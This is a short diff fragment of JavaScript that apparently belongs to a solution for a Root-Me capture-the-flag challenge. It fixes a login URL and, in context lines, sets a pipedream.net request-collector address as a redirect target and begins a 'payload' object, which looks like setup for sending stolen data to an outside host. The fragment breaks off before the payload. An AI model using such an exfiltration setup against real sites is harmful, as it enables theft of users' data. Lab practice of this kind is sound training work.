@@ -1,4 +1,4 @@
-let url = "challenge01.root-me.org:58003/login"
+let url = "http://challenge01.root-me.org:58003/login"
 let redirectURL = "https://eozr3kmrbmb1rnm.m.pipedream.net/?"
 let nullOpener = window.opener == null ? "yes":"non"
 let payload={
